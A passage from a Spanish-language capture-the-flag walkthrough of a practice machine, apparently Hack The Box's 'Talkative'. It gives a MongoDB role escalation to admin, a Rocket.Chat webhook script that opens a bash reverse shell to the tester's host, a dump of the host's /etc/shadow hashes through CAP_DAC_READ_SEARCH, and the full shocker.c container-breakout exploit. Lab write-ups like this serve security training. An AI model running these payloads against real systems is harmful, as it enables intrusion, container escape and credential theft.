<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">users</span>.<span style="color:#a6e22e">update</span>({<span style="color:#e6db74">&#34;_id&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;7i6rDHBTt3DLyLLjF&#34;</span>}, { <span style="color:#a6e22e">$set</span><span style="color:#f92672">:</span> { <span style="color:#e6db74">&#34;roles&#34;</span> <span style="color:#f92672">:</span> [<span style="color:#e6db74">&#34;admin&#34;</span>]}})
</span></span></code></pre></div><p><img src="images/Screenshot_22.png" alt="Write-up Image">
Asignamos el rol de <code>admin</code> a mi ID de usuario.
Ahora podemos comprobar que esto a funcionado, aunque vemos el campo <code>modifiedCount: 1</code> nunca está de mas comprobarlo.</p>
<pre tabindex="0"><code>...
emails: [ { address: &#39;pointed@talkative.htb&#39;, verified: false } ],
    type: &#39;user&#39;,
    status: &#39;online&#39;,
    active: true,
    _updatedAt: ISODate(&#39;2024-08-06T18:38:40.311Z&#39;),
    roles: [ &#39;admin&#39; ],
    name: &#39;pointed&#39;,
    lastLogin: ISODate(&#39;2024-08-06T18:38:36.002Z&#39;),
    statusConnection: &#39;online&#39;,
    utcOffset: 2,
    username: &#39;pointed&#39;
...
</code></pre><p>Y ahora podemos acceder al recurso <code>/admin</code> así que esto a funcionado.
<img src="images/Screenshot_23.png" alt="Write-up Image"></p>
<h2 id="foothold-in-container-3">Foothold in Container 3</h2>
<p>Ahora, siguiendo <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/rocket-chat">este post de HackTricks</a> podemos conseguir RCE creando un WebHook y estableciendo un script malicioso que se ejecutará en la máquina víctima.</p>
<p>Nos dirigimos a <code>Integrations</code> -&gt; <code>New Integration</code> -&gt; <code>Incoming WebHook</code></p>
<p>Rellenamos los datos que se nos pide.</p>
<p>Y en el apartado de <code>Script Enabled</code> , seleccionamos <code>True</code> y establecemos el script que se ejecutará cuando se reciba una petición al WebHook.
<img src="images/Screenshot_24.png" alt="Write-up Image"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">require</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">constructor</span>(<span style="color:#e6db74">&#39;return process.mainModule.require&#39;</span>)();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">exec</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.91/443 0&gt;&amp;1&#39;&#34;</span>)
</span></span></code></pre></div><p>Le damos a <code>Save changes</code>.
Y se nos genera una URL para poder utilizar el webhook que hemos creado.
<img src="images/Screenshot_25.png" alt="Write-up Image"></p>
<p>Ahora si nos ponemos en escucha por el puerto 443.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo pwncat-cs -lp <span style="color:#ae81ff">443</span>
</span></span></code></pre></div><p>Y en el navegador abrimos la URL que nos ha dado <code>(http://talkative.htb:3000/hooks/MKurWc9BYP8GQvs6v/F9cdMw7hYiRYBH7A75cpehnkszDJnYo7AbsAkQdvHtWgAjEf)</code></p>
<p>Vemos que recibimos la sesión.</p>
<pre tabindex="0"><code>[22:47:55] received connection from 10.129.222.158:60628                        bind.py:84
[22:47:57] 10.129.222.158:60628: registered new host w/ db
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> root@c150397ccd63:/app/bundle/programs/server# whoami
</span></span><span style="display:flex;"><span>root
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> root@c150397ccd63:/app/bundle/programs/server# hostname -I
</span></span><span style="display:flex;"><span>172.17.0.3
</span></span></code></pre></div><p>Vamos a subir el <code>linpeas.sh</code> ya que no encuentro nada interesante en este contenedor, ningún archivo, ni credencial&hellip;</p>
<pre tabindex="0"><code class="language-(local)" data-lang="(local)">/tmp/linpeas.sh ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 862.8/862.8 KB • ? • 0:00:00
[22:54:10] uploaded 862.78KiB in 2.27 seconds
</code></pre><p>No encuentro nada interesante.
Así que vamos a ejecutar <a href="https://github.com/cdk-team/CDK">cdk</a> , una herramienta para enumerar vías para escalar privilegios en contenedores docker.</p>
<p>Subimos el <code>cdk</code> al contenedor..</p>
<pre tabindex="0"><code>(local) pwncat$ upload cdk /tmp/cdk
/tmp/cdk ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 12.0/12.0 MB • 2.3 MB/s • 0:00:00
[23:03:22] uploaded 12.02MiB in 6.39 seconds
</code></pre><p>Con <code>cdk</code> realizamos un escaneo inicial, a ver si detecta algo.
<code>(remote) root@c150397ccd63:/tmp# ./cdk evaluate --full</code></p>
<p>¡Y encontramos algo!
<img src="images/Screenshot_26.png" alt="Write-up Image"></p>
<p>Tenemos una capability, <code>CAP_DAC_READ_SEARCH</code> con la cual podríamos leer archivos de la máquina anfitriona.
<code>cdk</code> nos aconseja que podríamos leer los archivos del host utilizando <code>cdk run cap-dac-read-search</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>./cdk run cap-dac-read-search
</span></span><span style="display:flex;"><span>Running with target: /etc/shadow, ref: /etc/hostname
</span></span><span style="display:flex;"><span>root:$6$9GrOpvcijuCP93rg$tkcyh.ZwH5w9AHrm66awD9nLzMHv32QqZYGiIfuLow4V1PBkY0xsKoyZnM3.AI.yGWfFLOFDSKsIR9XnKLbIY1:19066:0:99999:7:::
</span></span><span style="display:flex;"><span>daemon:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>bin:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>sys:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>sync:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>games:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>man:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>lp:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>mail:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>news:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>uucp:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>proxy:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>www-data:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>backup:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>list:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>irc:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>gnats:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>nobody:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>systemd-network:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>systemd-resolve:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>systemd-timesync:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>messagebus:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>syslog:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>_apt:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>tss:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>uuidd:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>tcpdump:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>landscape:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>pollinate:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>usbmux:*:18849:0:99999:7:::
</span></span><span style="display:flex;"><span>sshd:*:18849:0:99999:7:::
</span></span><span style="display:flex;"><span>systemd-coredump:!!:18849::::::
</span></span><span style="display:flex;"><span>lxd:!:18849::::::
</span></span><span style="display:flex;"><span>saul:$6$19rUyMaBLt7.CDGj$ik84VX1CUhhuiMHxq8hSMjKTDMxHt.ldQC15vFyupafquVyonyyb3/S6MO59tnJHP9vI5GMvbE9T4TFeeeKyg1:19058:0:99999:7:::
</span></span></code></pre></div><p>Y efectivamente, es vulnerable.</p>
<p>Pero como <code>cdk</code> te automatiza la explotación, no se podría utilizar en el OSCP.</p>
<p>¡Así que vamos a explotarlo manualmente!</p>
<h2 id="abusing-cap_dac_read_search">Abusing CAP_DAC_READ_SEARCH</h2>
<p>Podemos utilizar un exploit de openwall llamado <code>shocker.c</code> y modificarlo para conseguir lo que queramos.
<a href="https://tbhaxor.com/container-breakout-part-2/">https://tbhaxor.com/container-breakout-part-2/</a>
<a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;errno.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dirent.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// gcc shocker.c -o shocker
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> my_file_handle {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> handle_bytes;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> handle_type;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> f_handle[<span style="color:#ae81ff">8</span>];
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">die</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>msg)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">perror</span>(msg);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(errno);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">dump_handle</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> my_file_handle <span style="color:#f92672">*</span>h)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fprintf</span>(stderr,<span style="color:#e6db74">&#34;[*] #=%d, %d, char nh[] = {&#34;</span>, h<span style="color:#f92672">-&gt;</span>handle_bytes,
</span></span><span style="display:flex;"><span>    h<span style="color:#f92672">-&gt;</span>handle_type);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> h<span style="color:#f92672">-&gt;</span>handle_bytes; <span style="color:#f92672">++</span>i) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr,<span style="color:#e6db74">&#34;0x%02x&#34;</span>, h<span style="color:#f92672">-&gt;</span>f_handle[i]);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ((i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">20</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (i <span style="color:#f92672">&lt;</span> h<span style="color:#f92672">-&gt;</span>handle_bytes <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr,<span style="color:#e6db74">&#34;, &#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fprintf</span>(stderr,<span style="color:#e6db74">&#34;};</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">find_handle</span>(<span style="color:#66d9ef">int</span> bfd, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>path, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> my_file_handle <span style="color:#f92672">*</span>ih, <span style="color:#66d9ef">struct</span> my_file_handle
</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>oh)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> fd;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> ino <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> my_file_handle outh <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    .handle_bytes <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>,
</span></span><span style="display:flex;"><span>    .handle_type <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>    DIR <span style="color:#f92672">*</span>dir <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> dirent <span style="color:#f92672">*</span>de <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> <span style="color:#a6e22e">strchr</span>(path, <span style="color:#e6db74">&#39;/&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// recursion stops if path has been resolved
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>path) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memcpy</span>(oh<span style="color:#f92672">-&gt;</span>f_handle, ih<span style="color:#f92672">-&gt;</span>f_handle, <span style="color:#66d9ef">sizeof</span>(oh<span style="color:#f92672">-&gt;</span>f_handle));
</span></span><span style="display:flex;"><span>        oh<span style="color:#f92672">-&gt;</span>handle_type <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        oh<span style="color:#f92672">-&gt;</span>handle_bytes <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">++</span>path;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[*] Resolving &#39;%s&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, path);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open_by_handle_at</span>(bfd, (<span style="color:#66d9ef">struct</span> file_handle <span style="color:#f92672">*</span>)ih, O_RDONLY)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;[-] open_by_handle_at&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((dir <span style="color:#f92672">=</span> <span style="color:#a6e22e">fdopendir</span>(fd)) <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;[-] fdopendir&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (;;) {
</span></span><span style="display:flex;"><span>        de <span style="color:#f92672">=</span> <span style="color:#a6e22e">readdir</span>(dir);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>de)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[*] Found %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, de<span style="color:#f92672">-&gt;</span>d_name);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strncmp</span>(de<span style="color:#f92672">-&gt;</span>d_name, path, <span style="color:#a6e22e">strlen</span>(de<span style="color:#f92672">-&gt;</span>d_name)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[+] Match: %s ino=%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, de<span style="color:#f92672">-&gt;</span>d_name, (<span style="color:#66d9ef">int</span>)de<span style="color:#f92672">-&gt;</span>d_ino);
</span></span><span style="display:flex;"><span>            ino <span style="color:#f92672">=</span> de<span style="color:#f92672">-&gt;</span>d_ino;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[*] Brute forcing remaining 32bit. This can take a while...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (de) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">uint32_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0xffffffff</span>; <span style="color:#f92672">++</span>i) {
</span></span><span style="display:flex;"><span>            outh.handle_bytes <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>            outh.handle_type <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">memcpy</span>(outh.f_handle, <span style="color:#f92672">&amp;</span>ino, <span style="color:#66d9ef">sizeof</span>(ino));
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">memcpy</span>(outh.f_handle <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>, <span style="color:#f92672">&amp;</span>i, <span style="color:#66d9ef">sizeof</span>(i));
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ((i <span style="color:#f92672">%</span> (<span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">20</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[*] (%s) Trying: 0x%08x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, de<span style="color:#f92672">-&gt;</span>d_name, i);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">open_by_handle_at</span>(bfd, (<span style="color:#66d9ef">struct</span> file_handle <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>outh, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">closedir</span>(dir);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">close</span>(fd);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">dump_handle</span>(<span style="color:#f92672">&amp;</span>outh);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">find_handle</span>(bfd, path, <span style="color:#f92672">&amp;</span>outh, oh);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">closedir</span>(dir);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(fd);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc,<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[] )
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x1000</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> fd1, fd2;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> my_file_handle h;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> my_file_handle root_h <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        .handle_bytes <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>,
</span></span><span style="display:flex;"><span>        .handle_type <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>        .f_handle <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>}
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[***] docker VMM-container breakout Po(C) 2014 [***]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;[***] The tea from the 90&#39;s kicks your sekurity again. [***]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;[***] If you have pending sec consulting, I&#39;ll happily [***]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;[***] forward to my friends who drink secury-tea too! [***]</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;enter&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// get a FS reference from something mounted in from outside
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> ((fd1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/etc/hostname&#34;</span>, O_RDONLY)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;[-] open&#34;</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">find_handle</span>(fd1, argv[<span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>root_h, <span style="color:#f92672">&amp;</span>h) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;[-] Cannot find valid handle!&#34;</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[!] Got a final handle!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dump_handle</span>(<span style="color:#f92672">&amp;</span>h);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((fd2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">open_by_handle_at</span>(fd1, (<span style="color:#66d9ef">struct</span> file_handle <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>h, O_RDONLY)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;[-] open_by_handle&#34;</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">read</span>(fd2, buf, <span style="color:#66d9ef">sizeof</span>(buf) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;[-] read&#34;</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Success!!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    FILE <span style="color:#f92672">*</span>fptr;
</span></span><span style="display:flex;"><span>    fptr <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(argv[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;w&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fprintf</span>(fptr,<span style="color:#e6db74">&#34;%s&#34;</span>, buf);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>(fptr);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(fd2); <span style="color:#a6e22e">close</span>(fd1);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Como no soy un gran experto en C. Podemos pedirle a ChatGPT que nos explique que hace el script de forma detallada.</p>
<ol>
<li>
